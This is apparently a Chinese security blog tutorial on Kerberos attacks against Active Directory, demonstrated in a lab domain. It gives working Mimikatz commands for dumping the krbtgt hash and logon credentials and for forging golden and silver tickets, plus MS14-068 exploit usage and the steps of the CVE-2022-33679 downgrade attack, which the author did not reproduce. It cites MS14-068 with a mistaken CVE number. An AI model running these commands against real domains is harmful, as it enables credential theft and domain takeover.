#  域0day容易利用吗   
 蚁景网络安全   2025-05-22 09:54  
  
### 前言  
  
很久以前的一个例子了  
#### kerberos认证原理  
  
先了解几个概念  
  
认证服务(Authentication server）:简称AS,认证客户端身份提供认证服务。  
  
域控服务器(Domain Control）:即DC。  
  
服务票据(Server Ticket):简称ST，在Kerberos认证中，客户端请求的服务通过ST票据认证。  
  
票据授予服务(Ticket Granting server）:简称TGS，颁发服务票据(server ticket)。  
  
活动目录(Active Directory)：简称AD,包含了域中所有的对象(用户，计算机，组等)  
  
KDC密钥颁发中心（KDC）：域控担任  
  
特权属性证书(Privilege Attribute Certificate):简称PAC，所包含的是各种授权信息, 例如用户所属的用户组, 用户所具有的权限等。  
  
下图为Kerberos的认证过程：  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcDCh1DkSW53fzFRsOynfqFCEm4VSWhzktPsvich1xLrScTACa29jA6iaqdZBBLPJ4ic94FBH9tcqekw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
  
一个完整的认证流程基本上分为8个步骤  
  
1.客户端用户向KDC发送请求，包含用户名，主机名和时间戳。AS接收请求  
  
2.AS对客户端用户身份认证后给客户端返回票据授予票据  
  
3.客户端使用TGT到票据分发服务(TGS)请求访问服务器A的服务票据(ST)  
  
4.TGS给客户端分发ST  
  
5.客户端使用ST请求服务器A  
  
6.服务器A解密ST票据得到特权属性证书PAC,服务器A请求域控AD需确认用户权限  
  
7.域控将PAC解密获取用户SID和用户权限的结果返回给服务器A  
  
8.用户身份符合则进行第最后的返回信息，整个Kerberos认证结束。  
#### 黄金票据  
  
原理：  
  
Kerberos黄金票据是有效的TGT Kerberos票据，是由域Kerberos帐户加密和签名的 。TGT仅用于向域控制器上的KDC服务证明用户已被其他域控制器认证。TGT被KRBTGT密码散列加密并且可以被域中的任何KDC服务解密的。  
  
相当于跳过上面图片中过的步骤一和步骤二，直接伪造TGT  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcDCh1DkSW53fzFRsOynfqF1dCXhMD8tXDKagK1xbmh7kqsUMyZ2OLsMHEmjJXG4zMUxWxasbbibxw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
#### 实验  
  
这里是靶场环境  
  
环境：192.168.10.10 域控DC 域：Starseaseclab.com 操作系统：win-server2012R2  
  
域内主机：192.168.10.14 操作系统：win7  
  
使用条件  
- • 域管SID  
  
- • 域名  
  
- • 域控KRBTGT账号的HASHntlm(hash)  
  
> whoami /all  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcDCh1DkSW53fzFRsOynfqFib0xlcMCE2tkK7PaXabSSm3tbVxoZhgUa9DbpGahtY2uOJCp8IsnJTQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
> lsadump::dcsync /domain:starseaseclab.com /user:krbtgt  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcDCh1DkSW53fzFRsOynfqFBtzwQSldUz2FM2DIGHrMP2ZcWLicVBAibZSBW99MQgyic4QJKPOEE3avw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
  
sid:S-1-5-21-1719736279-3906200060-616816393  
  
htlm(hash):5e31f755b33b621bede0946b044908e4  
  
domian:starseaseclab.com  
  
域内主机win-7  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcDCh1DkSW53fzFRsOynfqFeY9aB6icy383Sxujy3kQ7v73zoEbsvBPrhSn4kY3IlbiariaIHS3htrIw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
```
privilege::debugkerberos::purge  //清空票据防止缓存影响Kerberos::golden /user:administrator /domain:starseaseclab.com /sid:S-1-5-21-1719736279-3906200060-616816393 /krbtgt:5e31f755b33b621bede0946b044908e4  /ptt    //伪造金票注入内存
```  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcDCh1DkSW53fzFRsOynfqFZcQ5e2Kc0t9JTAjwZcZ2GpxgYmM41AWpmS9ibh0cHKeYERDNniatIiaHw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
#### 白银票据  
  
原理  
  
黄金票据是伪造TGT,在kerberos认证中忽略前两步，白银票据就是直接伪造ST  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcDCh1DkSW53fzFRsOynfqFhCRQcoOMfjoFTAGEBV5DMoUnibsFianDfhOZsG2wmrToCopCsCctpXLw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
> whoami /all  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcDCh1DkSW53fzFRsOynfqFg6ZhHbfUjZtnSr6ibkiczAm5u3rlQ6o1SjgAj44oic5EXZDP9BStqTqcA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
  
sid: S-1-5-21-1719736279-3906200060-616816393  
> sekurlsa::logonpasswords  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcDCh1DkSW53fzFRsOynfqFibuj2G7ZYRvMalAcHQJJeRYEskicgocbN9Eo45EqhqqmfSHeYIOOZN9g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
  
伪造票据  
> Kerberos::golden /domain:starseaseclab.com /sid:S-1-5-21-1719736279-3906200060-616816393 /target:win-dc.starseaseclab.com /service:cifs /rc4:161cff084477fe596a5db81874498a24 /user:user1 /ptt //伪造银票注入内存  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcDCh1DkSW53fzFRsOynfqFsr7kkSvzzklGDRuTGVlOQiaPC6s0sMPzWyx48ZtAuRB4HGZGgeSWj4w/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
  
利用MS14-068(CVE-2016-6324)  
  
域内用户提升至域控  
  
条件 ：  
- • 域内用户名以及hash  
  
- • sid值  
  
- • 域名  
  
- • 域控ip  
  
```
 ms-14-068.exe -u   域用户@域名  -p 域用户密码 -s 域用户sid -d 域控ip kerberos::ptc "票据"   //将票据注入内存
```  
#### 黄金票据和白银票据的区别  
```
访问权限不同：Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限Silver Ticket：伪造TGS，只能访问指定的服务加密方式不同：Golden Ticket由Kerberos的Hash加密Silver Ticket由服务账号（通常为计算机账户）Hash加密认证流程不同：Golden Ticket的利用过程需要访问域控，Silver Ticket不需要
```  
#### CVE-2022-33679  
  
攻击的过程分为下面几个步骤  
1. 1. 攻击者发送一个没有预授权的 AS-REQ 请求 RC4-MD4 密钥加密。如果用户不需要预授权，KDC 将发回一个 AS-REP，其中包含使用 RC4-MD4 加密的会话密钥等。  
  
1. 2. 根据加密数据的长度，计算出加密密钥开始前的0x15字节，只要总长度就可以猜到。可能需要发送适当长的主机地址来填充 ASN1 编码数据，以便将密钥对齐到合适的位置。  
  
1. 3. 根据计算出的ASN1数据和加密后的KDC-REP生成密钥流的前0x2D字节（密文中前0x18字节全为0）。  
  
1. 4. 使用密钥流加密 PA-ENC-TIMESTAMP 预认证缓冲区，如果仅使用 KerberosTime，则大小将恰好为 0x15 字节，即带有初始填充的 0x2D。  
  
1. 5. 在新的 AS-REQ 中发送加密的时间戳以验证密钥流是否正确。  
  
如果将客户端和 KDC 降级为使用 RC4-MD4，攻击者可以让 KDC 使用 RC4-MD4 会话密钥作为初始 TGT，它只有 40 位的熵，并且在关联的票证过期之前实现暴力破解，可为该用户发出任意服务票证的 TGS 请求。  
  
攻击图解  
  
在请求TGT的第一阶段爆破第一个字节的图解  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcDCh1DkSW53fzFRsOynfqF3AGphEPIgIarM2UrFVGyaFOh892sQY4J2usG4lLoic2hf6D8iaTVJMxg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
  
获取最后一个字节的过程图解  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcDCh1DkSW53fzFRsOynfqFXUQoJomCUcXF9qoSuHOD0Hv7WAia4h8jAoaHOlLNe0rXotRfEBXCh1A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
  
CVE提交者的POC显示已删除，github上披露的EXP已经没了。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcDCh1DkSW53fzFRsOynfqF60MxfU5Rg0UwGfRibERnca2ic2DDOvmHfDPPf1NGiatQP6EQbMlFS6Kqw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
  
项目下载地址：  
```
https://github.com/GhostPack/Rubeus
```  
  
需要重新编译一下，**Rubeus**  
的V2.1.2实际上也没找到历史发布版本，目前最新版本未V2.2.1  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcDCh1DkSW53fzFRsOynfqFWZoY58NGRUnO8TkUsRdEicMVkGMvrGmYm9Jeu6icykJgPV35wDtTib3QA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
  
该版本无法使用cve-2022-33679伪造TGT。该漏洞就利用方式来说跟黄金票据有点儿类似，通过EXP绕过Kerberos认证协议中的第一和第二步骤，直接向TGS请求ST。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcDCh1DkSW53fzFRsOynfqFRFpcMhjjnjQWOBX0qf6R4KZ0PxPo42qjgD2iaI5JlwhNvyeLm1nWGxQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
#### 总结  
  
资料还是有限，没有复现成功，但是就原理来说，结合Kerberos认证原理还是比较清晰。CVE-2022-33679的使用也是有使用条件，需要设置“不需要 Kerberos 预身份验证”用户帐户控制标志，并配置了 RC4 密钥。所以在利用手段上来讲应该是比较苛刻。（  
如有错误还请各位指出  
）  
#### 参考链接  
  
来自0patch by ACROS Security  
的利用视频  
> https://www.youtube.com/watch?v=0elVZuNIMnc  
  
  
https://www.silverfort.com/blog/technical-analysis-of-cve-2022-33679-and-cve-2022-33647-kerberos-vulnerabilities/  
  
[](https://mp.weixin.qq.com/s?__biz=MzkxNTIwNTkyNg==&mid=2247549615&idx=1&sn=5de0fec4a85adc4c45c6864eec2c5c56&scene=21#wechat_redirect)  
  
